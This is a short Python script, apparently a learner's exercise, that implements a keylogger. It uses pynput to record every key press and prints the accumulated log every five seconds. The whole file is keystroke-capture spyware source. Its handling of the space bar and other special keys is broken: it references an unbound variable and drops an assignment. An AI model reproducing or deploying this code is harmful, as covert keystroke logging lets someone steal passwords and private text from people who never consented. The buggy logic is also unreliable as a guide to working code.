#!/usr/bin/env python3

""" A keylogger is used to record keys presses on the keyboard
"""

import pynput.keyboard #used to record key stokes
import threading #prevent interaption of the main running program

log = ""

class Keylogger:
	def __init__(self):#code put here will be run automaticaly
		self.log = ""

	def append_to_log(self, string):
		self.log = self.log + string


	def process_key_press(self, key):#functions inside class are called methods, methods inside a class must start with self
		try:
			current_key = str(key.char)
		except AttributeError:
			if key == key.space:
				log = log + " "
				current_key = ""
			else:
				current_key + ""
		self.append_to_log(current_key)


	def report(self):
		print (self.log)
		self.log = ""
		timer = threading.Timer(5, self.report)
		timer.start()


	def start(self):
		keyborad_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
		with keyborad_listener:
			self.report()
			keyborad_listener.join()
